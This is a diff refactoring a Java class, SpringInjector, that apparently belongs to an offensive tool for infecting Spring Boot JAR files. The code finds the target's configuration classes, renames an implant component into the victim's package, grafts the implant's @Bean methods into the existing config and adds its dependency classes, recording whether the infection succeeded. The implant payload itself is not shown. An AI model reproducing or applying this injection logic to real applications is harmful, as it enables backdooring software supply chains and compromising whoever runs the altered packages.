@@ -12,7 +12,8 @@ import java.util.jar.JarEntry;
 import java.util.logging.Logger;
 import java.util.zip.ZipException;
 
-import static org.example.injector.Helpers.*;
+import static org.example.injector.Helpers.asByteArray;
+import static org.example.injector.Helpers.jarLooksSigned;
 
 public class SpringInjector {
     private final static Logger log = Logger.getLogger("SpringInjector");
@@ -48,6 +49,7 @@ public class SpringInjector {
             ClassFile currentlyProcessing;
             try (DataInputStream in = new DataInputStream(entry.getContentStream())) {
                 currentlyProcessing = new ClassFile(in);
+                ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
                 if (!isSpringConfigurationClass(currentlyProcessing)) {
                     continue;
                 }
@@ -60,10 +62,10 @@ public class SpringInjector {
                  * component needs to be explicitly referenced as a @Bean in the config class.
                  */
                 ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
-                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
-                String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-                implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
+                ClassName implantComponentName = ClassName.of(implantComponent);
+                String targetPackageName = currentlyProcessingName.getPackageName();
+                implantComponent.setName(targetPackageName + "." + implantComponentName.getClassName());
+                JarEntry newJarEntry = new JarEntry(implantComponentName.getSpringJarEntryPath());
                 try {
                     fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
                     countComponentsCreated++;
@@ -107,25 +109,25 @@ public class SpringInjector {
 
         // Add any dependency classes needed for the implant
         if (didInfect) {
-            Map<String, byte[]> allDependencies = new HashMap<>();
+            Map<ClassName, byte[]> allDependencies = new HashMap<>();
             allDependencies.putAll(implantSpringConfigHandler.getDependencies());
             allDependencies.putAll(implantComponentHandler.getDependencies());
             // Since this injector involves two different implant handlers, do a bit of manual exclusion of themselves
-            allDependencies.remove(convertToJarEntryPathName(implantSpringConfigHandler.getImplantClassName()));
-            allDependencies.remove(convertToJarEntryPathName(implantComponentHandler.getImplantClassName()));
+            allDependencies.remove(implantSpringConfigHandler.getImplantClassName());
+            allDependencies.remove(implantComponentHandler.getImplantClassName());
             // Also note that the dependencies are not renamed in any way
             // Any custom classes bundled with the implant will contain the whole package name etc
 
-            for (Map.Entry<String, byte[]> dependencyEntry : allDependencies.entrySet()) {
-                String fileName = dependencyEntry.getKey();
+            for (Map.Entry<ClassName, byte[]> dependencyEntry : allDependencies.entrySet()) {
+                ClassName className = dependencyEntry.getKey();
                 byte[] fileContent = dependencyEntry.getValue();
 
-                JarEntry newJarEntry = new JarEntry("BOOT-INF/classes/" + fileName);
+                JarEntry newJarEntry = new JarEntry(className.getClassFilePath());
                 try {
                     fiddler.addNewEntry(newJarEntry, fileContent);
                 } catch (ZipException e) {
                     // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
-                    log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
+                    log.severe("Dependency file '" + className.getClassFilePath() + "' already exist. Aborting.");
                     didInfect = false;
                     break;
                 }
@@ -143,9 +145,12 @@ public class SpringInjector {
     }
 
     static boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
-        String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
-        String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
-        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
+        ClassName implantSpringConfigClassName = ClassName.of(implantSpringConfig);
+        ClassName existingSpringConfigClassName = ClassName.of(existingSpringConfig);
+        ClassName implantComponentClassName = ClassName.of(implantComponent);
+
+        String implantPackageDesc = implantSpringConfigClassName.getPackageName().replace(".", "/");
+        String targetPackageDesc = existingSpringConfigClassName.getPackageName().replace(".", "/");
 
         // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
         for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
@@ -156,8 +161,8 @@ public class SpringInjector {
 
             try {
                 Map<String, String> translateTable = new HashMap<>();
-                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
-                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
+                translateTable.put(implantPackageDesc + "/" + implantComponentClassName.getClassName(), targetPackageDesc + "/" + implantComponentClassName.getClassName());
+                translateTable.put(implantSpringConfigClassName.getClassFormatInternalName(), existingSpringConfigClassName.getClassFormatInternalName());
 
                 String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
                 MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
